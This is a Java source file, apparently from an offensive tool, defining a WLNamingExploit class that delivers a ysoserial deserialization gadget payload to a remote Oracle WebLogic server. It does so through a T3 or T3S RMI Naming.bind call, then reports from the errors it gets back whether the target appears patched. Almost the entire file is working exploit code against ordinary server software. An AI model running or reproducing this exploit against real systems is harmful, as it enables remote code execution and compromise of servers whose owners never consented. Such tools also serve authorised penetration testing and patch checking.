package bort.millipede.wlt3;

import java.rmi.Remote;
import java.rmi.MarshalException;

//third-party includes
import weblogic.rmi.Naming;
import weblogic.rjvm.PeerGoneException;
import ysoserial.payloads.util.Gadgets;

public class WLNamingExploit {
	public static void runWLNamingExploit(Object payload,String host,int port,boolean t3s) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		try {
			Naming.bind(protocol+"://"+host+":"+Integer.toString(port)+"/"+"Mcgarnigal"+System.nanoTime(),Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned"+System.nanoTime(),payload),Remote.class)); //weblogic T3 RMI bind-based exploitation
		} catch(MarshalException me) {
			me.printStackTrace();
			
			Throwable cause = me.getCause();
			if(cause!=null) {
				String eType = cause.getClass().getName();
				switch(eType) {
					case "javax.naming.NoPermissionException":
						System.err.println("javax.naming.NoPermissionException thrown, but this is normal for WLBind method.");
						break;
					default:
						System.err.println("Unknown Marshal Error occurred ("+eType+")!"); //TODO printout about --verbose setting
				}
			} else {
				System.err.println("Unknown Marshal Error occurred!"); //TODO printout about --verbose setting
			}
		} catch(PeerGoneException pge) {
			pge.printStackTrace();
			
			System.err.println("Target WebLogic Server at "+protocol+"://"+host+":"+port+" forcefully closed "+protocol.toUpperCase()+" connection! Server seems to be patched!");
		} catch(Exception e) {
			e.printStackTrace();
			
			System.err.println("Unknown Error occurred ("+e.getClass().getName()+")!"); //TODO printout about --verbose setting
		}
	}
}
